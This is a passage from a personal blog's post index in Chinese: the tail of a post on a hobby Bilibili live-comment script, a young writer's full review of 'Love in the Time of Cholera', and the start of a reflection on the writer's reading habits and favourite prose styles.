B站有API能够返回一个直播间最近的10条弹幕，可以依赖这个API接收弹幕。\n抓包可知一次发送弹幕的行为即为一次POST请求，可以使用python脚本实现发送信息。\n分别编写发送和接收弹幕的程序。开两个终端使用。\n第二阶段 开两个终端切换较为麻烦，于是萌生了把两个程序整合成一个的想法，想实现类似网页的上方是弹幕下方是输入框的效果。\n可行性分析 弹幕的动态捕捉依赖间隔固定时间地获取最近10条弹幕，提取出新的弹幕，显示在终端上，但是如果整合进输入程序，输入方法会阻塞进程，如果一直不输入就没有办法获取新的弹幕，所以需要为输入设定超时。\n查阅资料得知，为输入方法设定超时需要使用多线程，或者异步异常信息处理，刚学py，不会这些。。。\n查阅英文资料和pypi得知，python有个inputimeout库可以处理超时输入的问题，所以就整上了。\n但是在现在这一流程中，每次输入超时都需要清屏，这样每次更新弹幕的时候都会闪一下，体验非常不好。\n第三阶段 有没有办法实现一个terminal中分屏显示都个session呢？\n可行性分析 结合我个人的Linux使用经验，可以使用tmux这个工具实现分屏操作，所以第二阶段的工作就白做了。。。\n最终效果 不足与提升空间 冷启动时需要较多的步骤，不够优雅。\n未来可以尝试使用GUI框架封装代码，实现一个输出框一个输入框收发代码。\n1/25 Update 采用PysimpleGUI这个最简单的GUI库封装了代码，现在很好用（）","title":"Bilibili直播弹幕收发小程序"},{"content":"引言 我是不配谈“爱”的，因为我只是个18岁的“小孩”，并没有情感经历。\n但是这本在标题就明目张胆地写着爱情的书，写书评又绕不过对”爱情“的讨论，我只能边抄原文边说说我不成熟的感想。\n故事梗概相当简单：穷小子弗洛伦蒂诺·阿里萨在十八岁时对费尔明娜·达萨一见钟情，双方突破重重阻碍（主要是费尔明娜的父亲的反对）互通了几百封情书，最后见面时，费尔明娜看着眼前这个可怜人，与她心目中的那个人相距甚远，意识到他们之间不过是一场幻觉，便拒绝了弗洛伦蒂诺的求婚。之后费尔明娜嫁给了权贵，一个真正的绅士胡维纳尔·阿尔比诺医生，过了几十年的还算恩爱的夫妻生活，而弗洛伦蒂诺则一直把对费尔明娜的爱藏在心里，几十年间在社会上摸爬滚打，最后当上了航运公司的董事长。胡维纳尔·阿尔比诺医生去世那天，弗洛伦蒂诺第一时间找到费尔明娜，重申了自己对她矢志不渝的爱情，经过一段时间的磨合之后，两个老人终于完成了这场长达51年的爱情长跑。\n看看简介：\n 《霍乱时期的爱情》是加西亚•马尔克斯获得诺贝尔文学奖之后完成的第一部小说。讲述了一段跨越半个多世纪的爱情史诗，穷尽了所有爱情的可能性：忠贞的、隐秘的、粗暴的、羞怯的、柏拉图式的、放荡的、转瞬即逝的、生死相依的……再现了时光的无情流逝，被誉为“人类有史以来最伟大的爱情小说”，是20世纪最重要的经典文学巨著之一。\n 但粗看这个故事情节其实相当毁三观，弗洛伦蒂诺在与622个女人发生过肉体关系的情况下，仍对费尔明娜说了那句著名的“我为你保留了童真”，形容这场爱情为“一生一世”。看起来非常的魔幻现实。\n这究竟是不是又一个“盖茨比”式的故事，是不是又一个穷小子逆袭抱得美人归的滥俗套路？马尔克斯当然不可能这么肤浅，但在这里强行上升到人生的高度也大可不必，马尔克斯认为的爱情的本质是什么呢?先看看我在书中的一些摘抄。\n句子摘抄  “见到你我才发现，我们之间不过是一场幻觉。”（费尔明娜·达萨）\n 这是费尔明娜对弗洛伦蒂诺说的话，费尔明娜在见到弗洛伦蒂诺可怜的境遇后，瞬间明白了自己对他的感情不过是一种“同情心”，她称呼他为“可怜人”，对他的一切美好的幻想都烟消云散，摧毁爱情的有时不是拒绝，而是怜悯，“兴味索然，自欺欺人”，即使在这之前她还被一封一封文辞真挚隽永的情书所打动，就在这一刻，费尔明娜决心在记忆中抹去关于弗洛伦蒂诺的记忆，之后不久，她就嫁给了胡维纳尔·阿尔比诺医生。\n书信是思想最好的载体。文字能窥见一个人的灵魂，却因留下了过大的想象空间而容易无限放大对对方的固有印象。这里还有一句：\n 他只要看到那个女孩就感到心满意足了。渐渐地,他把她理想化了,把一些不可能的美德和想象出来的情感都安在她的身上。\n 陷入爱情的男女往往容易给他人加上不切实际的各种幻想（俗称“恋爱滤镜”），他们爱的已经不是具体的人，而是一种符号化的理想，所谓“距离产生美”可能也是这种原理吧。追求一个理想化的对象随之自身也收获了一种崇高感并乐在其中，这是大部分世俗化的爱情的普遍心理，这当然是伟大的，是浪漫的，是让追求者和被追求者都能产生价值感的，但是在马尔克斯笔下，费尔明娜亲口拒绝了这段感情。她认为自己是不爱弗洛伦蒂诺的。\n 如果两人能及时明白，比起婚姻中的巨大灾难，日常的琐碎烦恼更加难以躲避，或许他们的生活完全会是另一副样子。而如果说，他们在共同的生活中也多少学到了点什么，那就是智慧往往在已无用武之地时才来到我们身边。\n 婚姻或恋爱中的巨大灾难，反而能使双方建立起一种“革命友谊”。而日常碎屑的烦恼则会一点点磨碎理想化爱情的棱角，这既是互相加深了解的过程，也是理想化的对方跌落神坛的过程，如果在深入了解之后，依然能够常驻这份爱意，那这就会是一段相当幸福的感情。但大部分形成已久的羁绊，最后形成的也不过是一种共同生活的“默契”，早已缺乏了当年的激情。\n 她在儿子身体康复期间，训斥了他被动等候回音的消极状态。她提醒他，弱者永远无法进入爱情的王国，因为那是一个严酷、吝啬的国度，女人只会对意志坚强的男人俯首称臣，因为只有这样的男人才能带给她们安全感，她们渴望那种安全感，以面对生活的挑战。\n 弗洛伦蒂诺的母亲对弗洛伦蒂诺的告诫。男人应该意志坚强，坚定不移地追求所爱，弗洛伦蒂诺也许听懂了这份告诫，甚至做得有些过了头，他用了51年的时间确认了自己对费尔明娜的感情。\n 他原本不是她会选择的那种人，但他那过时的眼镜、神甫似的长袍，以及举手投足间的神秘感激起了她难以抵抗的好奇心，而她却从来没有想过，好奇心也是爱情的种种伪装之一。\n 对一个人产生好奇心，想要深入了解某个人，这也许是爱情产生的前奏。\n 她辩解说，爱情，首先是一种本能，“要么生下来就会，要么永远都不会”。\n 不知道该怎么评价这段话。。。有点扎心。\n 只有她们自己知道，她们曾经疯狂爱着的那个男人—尽管他或许也爱着她们—给她们带来的负担有多么沉重，她们不得不照顾他们直到最后一口气，喂他们吃喝，给他们换下脏兮兮的尿布，用母亲式的巧妙花招哄他们开心，以减轻他们清晨走出家门去直面现实的恐惧。可当看到他们受自己的鼓动离开家门，准备一口去吞掉整个世界时，她们又开始害怕男人会一去不复返。这就是生活。而爱，如果真的存在，则是另一回事：另一种生活。\n 爱情的负担同样无比沉重，也许为了抽象意义下的“生活”，双方都不得不放弃个人最初的理想（当然也有可能相互扶持着共同完成各自的理想，这是最优情况，这里谈普遍意义下的“妥协”），正如《个人的体验》中的鸟一样，接受了家庭的责任就意味着失去了实现自我理想的机会，就意味着晚年有可能带来的后悔。再来看下一句:\n “回答他说你愿意，”她对侄女说，“即便你害怕得要死，即便你以后可能后悔。因为如果你说不，无论如何你都会后悔一辈子。”\n 这是费尔明娜收到弗洛伦蒂诺求婚时，姑妈做出的建议。未做之事或是未答应之事往往带给人的后悔感比答应之事更强。去做一件事，意味着已经穷尽了这件事的可能性，而拒绝一件事，则意味着失去了一种可能的未来。每每想起只会不断自问：“如果我去做了，那么现在会怎样。”但时间对每个人都是公平的，如果去做了某事，也就意味着那时的你放弃了成为现在的你的机会，有可能会在失败中更加潦倒，但困住一个人的，从来都不是穷困潦倒，而是不甘心，是那句“我本可以”。\n 而如果她真的问了—依照着那无数条仪式性的家庭礼节中的一条—他就会看着报纸，连眼皮也不抬地回答说：“随便什么都行。”他说的是真心话，而且和颜悦色，自认为没有哪个丈夫比他更好商量了。可到了吃饭的时候，“随便什么”就不行了，必须符合他的喜好，不能有半点瑕疵：肉不能有肉味儿，鱼不能有鱼味儿，猪肉不能吃出疥疮似的腥味，鸡肉不能吃出鸡毛的味道。即便不是吃芦笋的季节，也得不惜代价地为他找来，为的是让他能在自己尿液的芬芳气息中怡然自得。她不怨他，只怨生活。但他是生活中难以安抚的主角。只要稍有怀疑，他就会把桌上的盘子一推，说：“这顿饭没有用爱来做。”\n 胡维纳尔·阿尔比诺医生与费尔明娜的婚姻生活。\n胡维纳尔医生是个真正的绅士，言行举止高雅上流，但是费尔明娜却在与他共同生活的过程中处处感到“心累”。因为医生的高高在上且从不尊重她的劳动成果，认为“家务事”是简单的活，这种婚姻关系中双方地位的不对等让费尔明娜对这段感情的本质感到绝望。可以说结婚这么多年，费尔明娜虽然为医生做了一辈子家务，抚养了几个儿女，但他们的感情绝对不是马尔克斯心目中“真正的爱情”。这段话同样让我想起了我自己，因为我也很喜欢说“随便”。。。在与人相处的过程中也要保持真诚，衷心说出自己的真实想法。\n 事实上，胡维纳尔·乌尔比诺的追求从来不是用爱的语言表达的，而且奇怪的是—至少可以说是奇怪—像他那样一个天主教的卫士，向她提供的竟然仅限于世俗的好处：**安全感、和谐和幸福，这些东西一旦相加，或许看似爱情，也几乎等于爱情。但它们终究不是爱情。**这些疑虑增加了她的彷徨，因为她也并不坚信爱情当真就是她生活中最需要的东西。\n 。。。\n作品内核分析 再来看看作品的介绍“讲述了一段跨越半个多世纪的爱情史诗，穷尽了所有爱情的可能性”。\n爱情是什么？为什么弗洛伦蒂诺在与622个女人发生过肉体关系的情况下，仍能对费尔明娜说出“我为你保留了童真”？\n因为两人长达52年的小心翼翼的互相确认。\n费尔明娜在看似“幸福美满”的婚姻中意识到了弗洛伦蒂诺这个”幽灵“在她的脑海之中挥之不去，意识到了物质的富足并不等于爱情，意识到了这种看似已经被升华成亲情的爱情背后渗透着女人对物质满足感的本质的误判。**她享受着与胡维纳尔在人前扮演恩爱夫妻的满足感，享受着医生为她带来的安定生活，享受着抚养孩子的成就感，这种安心感被她误认为爱情。**可她却没有意识到，这一切与胡维纳尔医生本人并没有多大关系，任何一个同样物质条件的男人，都能给她这一切。\n弗洛伦蒂诺则更是在一次又一次地确认着自己对费尔明娜的感情，他不断地与各种女人开启新的感情，只为了把费尔明娜”忘掉“，但一次又一次地试图遗忘，一次又一次地确认感情，一次又一次地失败，”忘不了“，更说明了弗洛伦蒂诺对费尔明娜的痴情。弗洛伦蒂诺一开始地疯狂写情书是他精神世界的一场幼稚的狂欢，是对理想化的神话的费尔明娜的追求，但是当费尔明娜真正嫁人之后，试图忘掉她也好，证明也罢，**弗洛伦蒂诺所经历的一切都在不断擦亮这场狂欢，不断为当年的幼稚加上成熟的注脚。他一次又一次开启新的感情，一次又一次意识到费尔明娜在他内心中的特殊地位，一次又一次迷失了自我。**这也使得最后弗洛伦蒂诺时隔51年的表白如此震撼人心。\n那么，爱情是这本书的全部吗？\n很显然不是的，弗洛伦蒂诺为什么无法爱人，在他疯狂的寻花问柳的过程中，有不少女人爱上了他，他也有过多次的爱上她人的错觉。那又是什么让弗洛伦蒂诺无法达到结婚的现实呢？\n是孤独。\n怪罪于“爱”的孤独 上文中有意隐去了社会背景，纯粹讨论了这本书中两人漫长爱情的基本历程。让我们回到书名《霍乱时期的爱情》。\n这是一个什么样的社会呢？\n 在同一天，他看见河上漂过三具膨胀发绿的尸体，上面还站着几只兀鹫。最先是两具男尸，其中一具没了头，而后漂过一具只有几岁的女童的尸体，她那美杜莎般的头发在船尾的航迹中上下漂浮。他永远也不会知道，因为根本没人知道，他们到底是霍乱还是战争的牺牲品，但那令人恶心的强烈气味污染了他心中对费尔明娜·达萨的思念。\n 是霍乱还有战争肆虐的社会，是一个饱受殖民者压迫的社会，是一个人类所有的光荣与尊严都被肆意践踏的社会。在这里，发生着无数不被后世之人相信的现实，是一种不断循环的，历史性的孤独。\n是的，这本“爱情小说”，可能自始至终都不存在“爱情”。在一个生存意义已经被大致消解的世界，“爱情”成了个人活着的最后的被普遍接受的理由。\n 霍乱刚刚流行两个星期，墓地就已经满了。尽管已将一大批不知名的贵人的枯骨迁进了集体掩埋的万人坑，教堂里还是腾不出一块可以使用的空墓地来。从没有封严的墓穴中逸出的水汽令大教堂内空气污浊，不得不将大门紧闭，直到三年以后，费尔明娜·达萨在子时弥撒中第一次近距离地看见弗洛伦蒂诺·阿里萨的那个时候才再次打开。第三周时，圣克拉拉修道院的回廊里已堆满了死人，一直堆到两边种着杨树的林荫道。最后，只得把比回廊大两倍的教会菜园辟出来当墓地。人们在那里挖掘出一个个很深的墓穴，不带棺木地草草葬下三层死人。但很快又不得不放弃了这种方式，因为被填得满满当当的土地变成了一块海绵，脚一踩，就渗出一股令人作呕的血水来。于是，人们准备在“上帝之手”庄园开辟新战场。那里是一座育肥牧场，距离城市不到一里地，后来被誉为“普世公墓”。\n自从发布了霍乱公告，本地驻军便不论白天黑夜，每隔一刻钟在碉堡上鸣炮一响。这么做是应迷信的市民要求，因为他们认为火药能净化环境。受霍乱之害最深的要数黑人，因为他们人数最多，也最贫穷。但实际上，这种疾病既不分肤色，也不分血统。而就如突然开始一样，它又突然停止了。从来没有人知道它到底造成了多大规模的伤害，不是因为无法统计，而是因为我们最常见的美德之一就是家丑不可外扬。\n \u0026ldquo;普世公墓\u0026quot;是现实的魔幻，”家丑不可外扬“是一切记录被模糊化处理后的历史的虚无，也如医生的徒弟所感慨的那样：“现在还能碰见不是因爱情而自杀的人，真是遗憾。”\n弗洛伦蒂诺是幸运的，他为自己的孤独寻找了“爱情”这一理由以作慰藉。他为此而努力，为此而堕落，为此而生活。他为自己的人生赋予了崇高的意义，而拉美人民呢？虚伪的政治，崩溃的经济，常年的战乱，还有肆虐的霍乱，多少人在此中醉生梦死。\n弗孤独了，他说自己没被爱过，但不乏真心爱他的女人，只是现实的荒诞让他无所适从，个人意志的自我毁灭冲动让感到眼前的一切只是冰冷的泡沫。他只能怪罪于求爱不得，只能靠着费尔明娜·达萨在他心中的幻影，支撑着他免于彻底堕落的命运。这种孤独是全人类的，普遍性的，是现代社会个人意志的普遍觉醒所带来的必然结果，又有多少人像弗洛伦蒂诺一样，找到了消解孤独的理由呢？\n 因为这座城市，他的城市，至今仍处在时代的边缘：它依旧是当初那座炎热干燥的城市，夜晚也仍旧充斥着那些让他觉得恐怖不已的事，但同时，也仍能让人感受到青春期那种孤独的快乐。在这里，鲜花会生锈，盐巴会腐烂。四个世纪以来，除了在凋谢的月桂树和腐臭的沼泽间慢慢衰老，这里什么都没有发生。\n \u0026ldquo;这里什么也没有发生\u0026rdquo;\n写在后面 由于这本书的特殊性，这篇书评的整体基调似乎有些过于沉重了。但是你完全可以把我这个毫无经验的18岁小屁孩的分析当空话，马尔克斯这样的世界性作家，其作品的解读本身就带有多义性，一劳永逸的解读是不存在的，从书评家那里获得的解读，是经过特定的评论角度折射的，诚然我们可以从中获得十分精彩的发现和阐释，但它更多地体现着评论家自身的睿智和素养。\n更何况这是我的第二篇书评，肯定也有很多很多很多很多的不足之处，水平有限，请多包涵！\n有人说年轻人对于爱情的理解过于粗浅，很容易被浮于表面的感情打动。我认为这没有什么不好，人生本就是个体验的过程，你不能指望事事都深重而苦难，事事都富有哲思而隽永，事事都能写成浪漫的剧本流传后世，千年不朽。事实上，大多数人的感情生活没有那么复杂，胡维纳尔医生那样的伴侣才是大多数人的理想型，文艺作品带给人的是一种思考，一种美学意义上的享受，代入现实大可不必（更何况是马尔克斯这样的作家的作品）。\n费尔米娜·达萨出于对爱情的恐惧而拒绝了弗洛伦蒂诺的告白，使这场爱情迟到了51年。\n在现实中，没有那么多复杂而深刻的哲理，勇敢去爱吧，不要因为几部文学作品而深陷于作家构筑的幻想世界而无法自拔，封闭自己的内心，觉得看透了一切而懒得尝试，积极进取、大胆尝试才是人生的主旋律！\n","permalink":"https://zeroy.site/articles/El-Amor-En-Los-Tiempos-Del-Colera/","summary":"引言 我是不配谈“爱”的，因为我只是个18岁的“小孩”，并没有情感经历。\n但是这本在标题就明目张胆地写着爱情的书，写书评又绕不过对”爱情“的讨论，我只能边抄原文边说说我不成熟的感想。\n故事梗概相当简单：穷小子弗洛伦蒂诺·阿里萨在十八岁时对费尔明娜·达萨一见钟情，双方突破重重阻碍（主要是费尔明娜的父亲的反对）互通了几百封情书，最后见面时，费尔明娜看着眼前这个可怜人，与她心目中的那个人相距甚远，意识到他们之间不过是一场幻觉，便拒绝了弗洛伦蒂诺的求婚。之后费尔明娜嫁给了权贵，一个真正的绅士胡维纳尔·阿尔比诺医生，过了几十年的还算恩爱的夫妻生活，而弗洛伦蒂诺则一直把对费尔明娜的爱藏在心里，几十年间在社会上摸爬滚打，最后当上了航运公司的董事长。胡维纳尔·阿尔比诺医生去世那天，弗洛伦蒂诺第一时间找到费尔明娜，重申了自己对她矢志不渝的爱情，经过一段时间的磨合之后，两个老人终于完成了这场长达51年的爱情长跑。\n看看简介：\n 《霍乱时期的爱情》是加西亚•马尔克斯获得诺贝尔文学奖之后完成的第一部小说。讲述了一段跨越半个多世纪的爱情史诗，穷尽了所有爱情的可能性：忠贞的、隐秘的、粗暴的、羞怯的、柏拉图式的、放荡的、转瞬即逝的、生死相依的……再现了时光的无情流逝，被誉为“人类有史以来最伟大的爱情小说”，是20世纪最重要的经典文学巨著之一。\n 但粗看这个故事情节其实相当毁三观，弗洛伦蒂诺在与622个女人发生过肉体关系的情况下，仍对费尔明娜说了那句著名的“我为你保留了童真”，形容这场爱情为“一生一世”。看起来非常的魔幻现实。\n这究竟是不是又一个“盖茨比”式的故事，是不是又一个穷小子逆袭抱得美人归的滥俗套路？马尔克斯当然不可能这么肤浅，但在这里强行上升到人生的高度也大可不必，马尔克斯认为的爱情的本质是什么呢?先看看我在书中的一些摘抄。\n句子摘抄  “见到你我才发现，我们之间不过是一场幻觉。”（费尔明娜·达萨）\n 这是费尔明娜对弗洛伦蒂诺说的话，费尔明娜在见到弗洛伦蒂诺可怜的境遇后，瞬间明白了自己对他的感情不过是一种“同情心”，她称呼他为“可怜人”，对他的一切美好的幻想都烟消云散，摧毁爱情的有时不是拒绝，而是怜悯，“兴味索然，自欺欺人”，即使在这之前她还被一封一封文辞真挚隽永的情书所打动，就在这一刻，费尔明娜决心在记忆中抹去关于弗洛伦蒂诺的记忆，之后不久，她就嫁给了胡维纳尔·阿尔比诺医生。\n书信是思想最好的载体。文字能窥见一个人的灵魂，却因留下了过大的想象空间而容易无限放大对对方的固有印象。这里还有一句：\n 他只要看到那个女孩就感到心满意足了。渐渐地,他把她理想化了,把一些不可能的美德和想象出来的情感都安在她的身上。\n 陷入爱情的男女往往容易给他人加上不切实际的各种幻想（俗称“恋爱滤镜”），他们爱的已经不是具体的人，而是一种符号化的理想，所谓“距离产生美”可能也是这种原理吧。追求一个理想化的对象随之自身也收获了一种崇高感并乐在其中，这是大部分世俗化的爱情的普遍心理，这当然是伟大的，是浪漫的，是让追求者和被追求者都能产生价值感的，但是在马尔克斯笔下，费尔明娜亲口拒绝了这段感情。她认为自己是不爱弗洛伦蒂诺的。\n 如果两人能及时明白，比起婚姻中的巨大灾难，日常的琐碎烦恼更加难以躲避，或许他们的生活完全会是另一副样子。而如果说，他们在共同的生活中也多少学到了点什么，那就是智慧往往在已无用武之地时才来到我们身边。\n 婚姻或恋爱中的巨大灾难，反而能使双方建立起一种“革命友谊”。而日常碎屑的烦恼则会一点点磨碎理想化爱情的棱角，这既是互相加深了解的过程，也是理想化的对方跌落神坛的过程，如果在深入了解之后，依然能够常驻这份爱意，那这就会是一段相当幸福的感情。但大部分形成已久的羁绊，最后形成的也不过是一种共同生活的“默契”，早已缺乏了当年的激情。\n 她在儿子身体康复期间，训斥了他被动等候回音的消极状态。她提醒他，弱者永远无法进入爱情的王国，因为那是一个严酷、吝啬的国度，女人只会对意志坚强的男人俯首称臣，因为只有这样的男人才能带给她们安全感，她们渴望那种安全感，以面对生活的挑战。\n 弗洛伦蒂诺的母亲对弗洛伦蒂诺的告诫。男人应该意志坚强，坚定不移地追求所爱，弗洛伦蒂诺也许听懂了这份告诫，甚至做得有些过了头，他用了51年的时间确认了自己对费尔明娜的感情。\n 他原本不是她会选择的那种人，但他那过时的眼镜、神甫似的长袍，以及举手投足间的神秘感激起了她难以抵抗的好奇心，而她却从来没有想过，好奇心也是爱情的种种伪装之一。\n 对一个人产生好奇心，想要深入了解某个人，这也许是爱情产生的前奏。\n 她辩解说，爱情，首先是一种本能，“要么生下来就会，要么永远都不会”。\n 不知道该怎么评价这段话。。。有点扎心。\n 只有她们自己知道，她们曾经疯狂爱着的那个男人—尽管他或许也爱着她们—给她们带来的负担有多么沉重，她们不得不照顾他们直到最后一口气，喂他们吃喝，给他们换下脏兮兮的尿布，用母亲式的巧妙花招哄他们开心，以减轻他们清晨走出家门去直面现实的恐惧。可当看到他们受自己的鼓动离开家门，准备一口去吞掉整个世界时，她们又开始害怕男人会一去不复返。这就是生活。而爱，如果真的存在，则是另一回事：另一种生活。\n 爱情的负担同样无比沉重，也许为了抽象意义下的“生活”，双方都不得不放弃个人最初的理想（当然也有可能相互扶持着共同完成各自的理想，这是最优情况，这里谈普遍意义下的“妥协”），正如《个人的体验》中的鸟一样，接受了家庭的责任就意味着失去了实现自我理想的机会，就意味着晚年有可能带来的后悔。再来看下一句:\n “回答他说你愿意，”她对侄女说，“即便你害怕得要死，即便你以后可能后悔。因为如果你说不，无论如何你都会后悔一辈子。”\n 这是费尔明娜收到弗洛伦蒂诺求婚时，姑妈做出的建议。未做之事或是未答应之事往往带给人的后悔感比答应之事更强。去做一件事，意味着已经穷尽了这件事的可能性，而拒绝一件事，则意味着失去了一种可能的未来。每每想起只会不断自问：“如果我去做了，那么现在会怎样。”但时间对每个人都是公平的，如果去做了某事，也就意味着那时的你放弃了成为现在的你的机会，有可能会在失败中更加潦倒，但困住一个人的，从来都不是穷困潦倒，而是不甘心，是那句“我本可以”。\n 而如果她真的问了—依照着那无数条仪式性的家庭礼节中的一条—他就会看着报纸，连眼皮也不抬地回答说：“随便什么都行。”他说的是真心话，而且和颜悦色，自认为没有哪个丈夫比他更好商量了。可到了吃饭的时候，“随便什么”就不行了，必须符合他的喜好，不能有半点瑕疵：肉不能有肉味儿，鱼不能有鱼味儿，猪肉不能吃出疥疮似的腥味，鸡肉不能吃出鸡毛的味道。即便不是吃芦笋的季节，也得不惜代价地为他找来，为的是让他能在自己尿液的芬芳气息中怡然自得。她不怨他，只怨生活。但他是生活中难以安抚的主角。只要稍有怀疑，他就会把桌上的盘子一推，说：“这顿饭没有用爱来做。”\n 胡维纳尔·阿尔比诺医生与费尔明娜的婚姻生活。\n胡维纳尔医生是个真正的绅士，言行举止高雅上流，但是费尔明娜却在与他共同生活的过程中处处感到“心累”。因为医生的高高在上且从不尊重她的劳动成果，认为“家务事”是简单的活，这种婚姻关系中双方地位的不对等让费尔明娜对这段感情的本质感到绝望。可以说结婚这么多年，费尔明娜虽然为医生做了一辈子家务，抚养了几个儿女，但他们的感情绝对不是马尔克斯心目中“真正的爱情”。这段话同样让我想起了我自己，因为我也很喜欢说“随便”。。。在与人相处的过程中也要保持真诚，衷心说出自己的真实想法。\n 事实上，胡维纳尔·乌尔比诺的追求从来不是用爱的语言表达的，而且奇怪的是—至少可以说是奇怪—像他那样一个天主教的卫士，向她提供的竟然仅限于世俗的好处：**安全感、和谐和幸福，这些东西一旦相加，或许看似爱情，也几乎等于爱情。但它们终究不是爱情。**这些疑虑增加了她的彷徨，因为她也并不坚信爱情当真就是她生活中最需要的东西。\n 。。。\n作品内核分析 再来看看作品的介绍“讲述了一段跨越半个多世纪的爱情史诗，穷尽了所有爱情的可能性”。\n爱情是什么？为什么弗洛伦蒂诺在与622个女人发生过肉体关系的情况下，仍能对费尔明娜说出“我为你保留了童真”？\n因为两人长达52年的小心翼翼的互相确认。\n费尔明娜在看似“幸福美满”的婚姻中意识到了弗洛伦蒂诺这个”幽灵“在她的脑海之中挥之不去，意识到了物质的富足并不等于爱情，意识到了这种看似已经被升华成亲情的爱情背后渗透着女人对物质满足感的本质的误判。**她享受着与胡维纳尔在人前扮演恩爱夫妻的满足感，享受着医生为她带来的安定生活，享受着抚养孩子的成就感，这种安心感被她误认为爱情。**可她却没有意识到，这一切与胡维纳尔医生本人并没有多大关系，任何一个同样物质条件的男人，都能给她这一切。\n弗洛伦蒂诺则更是在一次又一次地确认着自己对费尔明娜的感情，他不断地与各种女人开启新的感情，只为了把费尔明娜”忘掉“，但一次又一次地试图遗忘，一次又一次地确认感情，一次又一次地失败，”忘不了“，更说明了弗洛伦蒂诺对费尔明娜的痴情。弗洛伦蒂诺一开始地疯狂写情书是他精神世界的一场幼稚的狂欢，是对理想化的神话的费尔明娜的追求，但是当费尔明娜真正嫁人之后，试图忘掉她也好，证明也罢，**弗洛伦蒂诺所经历的一切都在不断擦亮这场狂欢，不断为当年的幼稚加上成熟的注脚。他一次又一次开启新的感情，一次又一次意识到费尔明娜在他内心中的特殊地位，一次又一次迷失了自我。**这也使得最后弗洛伦蒂诺时隔51年的表白如此震撼人心。\n那么，爱情是这本书的全部吗？\n很显然不是的，弗洛伦蒂诺为什么无法爱人，在他疯狂的寻花问柳的过程中，有不少女人爱上了他，他也有过多次的爱上她人的错觉。那又是什么让弗洛伦蒂诺无法达到结婚的现实呢？\n是孤独。\n怪罪于“爱”的孤独 上文中有意隐去了社会背景，纯粹讨论了这本书中两人漫长爱情的基本历程。让我们回到书名《霍乱时期的爱情》。\n这是一个什么样的社会呢？\n 在同一天，他看见河上漂过三具膨胀发绿的尸体，上面还站着几只兀鹫。最先是两具男尸，其中一具没了头，而后漂过一具只有几岁的女童的尸体，她那美杜莎般的头发在船尾的航迹中上下漂浮。他永远也不会知道，因为根本没人知道，他们到底是霍乱还是战争的牺牲品，但那令人恶心的强烈气味污染了他心中对费尔明娜·达萨的思念。\n 是霍乱还有战争肆虐的社会，是一个饱受殖民者压迫的社会，是一个人类所有的光荣与尊严都被肆意践踏的社会。在这里，发生着无数不被后世之人相信的现实，是一种不断循环的，历史性的孤独。\n是的，这本“爱情小说”，可能自始至终都不存在“爱情”。在一个生存意义已经被大致消解的世界，“爱情”成了个人活着的最后的被普遍接受的理由。","title":"怪罪于爱的孤独 《霍乱时期的爱情》书评"},{"content":"前言 今天与人聊起看过的书，发现多年来虽然阅读量不少，却从没做过系统的整理，所以就有了这篇文章。初高中因为客观条件的限制，只能阅读纸质书，只记得总数很多，经过一个下午的回想，也没想起来多少，所以在这篇文章中出现的初高中读的作品都是印象很深刻的，很经典的作品，也算是变相筛掉了一些层次不高的消遣类读物吧。\n评价标准 我不止一次问自己，一本书打动我的究竟是什么，经过思考，我觉得可以大抵分为两类：“历史沧桑感”与“个人意识感染力”。在第一类书中，你能够感觉到作者表现出来的，某个时代，某个地区的人民的某种特殊的生存状态，能够感受到遥远的时空那端的人们与屏幕前的你的“精神共振”，看这种书的时候，你脑海里的想象画面是带着一层灰色滤镜的，因为作者时时刻刻都在传递着**“这不仅仅是小说，这反映的是那个时代的历史”**。在第二类书中，作者想要传递的是一种精神层面的震撼，一种个人意志的表达，这种小说的背景无关紧要，往往主角贯穿始终或者直接采用第一人称进行写作，甚至故事设置的时空背景与作者本人生活的时空背景相距甚远。但这不是重点，作者想要通过主角的经历，引发读者对某种精神困境的思考，越现代的小说往往越追求这种超时空的表达。任何一本书只要在以上两点中有任何一点打动我，在我这里它就是一本好书，这两点本身也没有高下之分。还有一类书无法归类到这两点中，这之后再说。\n再来说说文风。文风上每个作家都各有特色，就我个人而言，我更偏好强剧情推动性的文字搭配简短的，想象空间高的环境描写。因为现代社会媒介已经很发达了，客观来讲，大段大段的环境描写已经对现代人失去了吸引力（尤其是翻译作品，连这种描写的韵味也在翻译的过程中丧失了）。我最喜欢什么样的文风呢，这里举个例子：\n 海滩上也是火热的阳光。大海在急速而憋闷地喘息着，层层细浪拍击着沙岸。我漫步走向那片岩石，感到脑袋在太阳照射下膨胀起来了。周围的酷热都聚焦在我的身上，叫我举步维艰。每一阵热风扑面而来，我就要咬紧牙关，攥紧裤口袋里的拳头，全身绷紧，为的是能战胜太阳与它倾泻给我的那种昏昏然的迷幻感。从沙砾上、从白色贝壳上、从玻璃碎片上，投射出来的反光像一道道利剑，刺得我睁不开眼，不得不牙关紧缩。就这样我走了好久。《局外人》阿尔贝·加缪\n 短促明快并且清晰地展现了默尔索先生在“行凶”前后所感受到的“荒诞感”，陀思妥耶夫斯基也是这种文风，如果不是因为俄国人的名字太长太难记，这里引用的就是他的书。如果给我的喜好做几个特征抽象的话，就是：\n 视角相对集中，最好使用第一人称 环境描写主观性要强，要对当前描写的对象的精神产生显著影响，并引导其之后的行为 说人话，翻译作品不应有太明显的翻译痕迹  再摘一段我很喜欢的描写：\n “刚才，在那边，有为子给宪兵抓走了。我们一起去看看吧！”\n我趿拉着木屐跑去。月夜清明，收割后的稻田里随处能看到稻架清晰的影子。\n小树林的树荫里聚集着黑压压的一群人，不停地蠕动着。有为子穿着黑制服，坐在地面上，面色煞白。身边站着四五个宪兵和她的父母。一个宪兵拿出饭盒般的东西，对她吼叫着。她父亲向宪兵百般示好，反复求情，不住责骂女儿。母亲在一旁痛哭流涕。\n我们站在田畦上，隔着一块稻田眺望。看热闹的人越来越多，彼此肩膀挨着肩膀，默默无语。月亮也仿佛被压挤得缩小了，挂在我们头顶上。\n同学对着我的耳朵叙说着。\n有为子是在带着饭盒走出家门、打算到邻村去的当儿，被埋伏的宪兵抓到的。那饭盒显然是送给逃兵的。逃兵和有为子在海军医院亲近，后来，怀孕的有为子被医院赶出来了。宪兵问她那个逃兵躲在哪里，有为子坐着一动不动，顽固地一声不吭。……\n我呢，眼睛一眨不眨凝视着有为子的脸，她像一个被抓到的女疯子，月光之下，面孔毫无表情。我以前从未见过死不认罪的面孔，我想到了自己遭到世界拒绝的面孔。然而，有为子的面孔却是拒绝世界的。月光一个劲儿流泻在她的额头、眼睛、鼻梁和面颊上，那副纹丝不动的容颜只是被月光洗涤着。她只要眼睛倏忽一亮，稍稍扭动一下嘴角，她所拒绝的世界似乎就会顺势从那里涌流进去。\n《金阁